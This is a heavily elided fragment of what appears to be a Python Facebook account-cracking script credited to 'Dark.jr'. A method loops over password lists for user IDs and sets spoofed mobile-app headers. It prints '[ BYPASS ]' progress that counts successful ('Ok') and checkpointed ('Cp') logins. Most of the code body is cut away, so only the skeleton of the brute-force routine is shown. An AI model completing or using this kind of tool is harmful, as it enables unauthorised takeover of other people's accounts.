...
os.system("xdg-open https://www.facebook.com/Dark.jr.0004?mibextid=ZbWKwL")
try:
...
class Main:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write("\r [ BYPASS ] %s/%s -> Cp:-%s - Ok:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok)))
		sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			headers = {
				...
				"x-fb-net-hni": str(random.randint(20000, 40000)), #don't_change_creadit_its_dark_jr
